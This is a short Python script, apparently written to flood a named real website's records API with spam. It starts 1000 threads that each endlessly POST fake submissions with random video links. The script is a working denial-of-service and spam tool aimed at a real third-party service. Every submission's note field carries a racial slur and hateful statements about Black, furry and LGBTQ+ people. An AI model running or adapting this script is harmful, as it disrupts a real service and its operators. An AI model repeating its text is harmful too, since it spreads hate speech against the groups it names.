import string
import random
import os
from threading import Thread
import requests

os.system('cls')

def generator(size=11, chars=string.ascii_uppercase + string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def dos():
    while(True):
        url = 'https://pointercrate.com/api/v1/records/'
        generated = generator()
        json = {
            "demon":250,
            "player":"Spike",
            "progress":54,
            "video":"https://youtu.be/" + generated,
            "note":"nanachi + spk. // hate niggers, furrys and lgbtq+ people. have fun <3"
        }
        try:
            r = requests.post(url, json=json)
        except Exception:
            continue
        if r.status_code == 201:
            print('posted!')
        else:
            print('Next post in: ' + str(r.json()['data']['remaining']['secs'])+ '\n' + generated)
        print()

for i in range(1000):
    t = Thread(target=dos)
    t.start()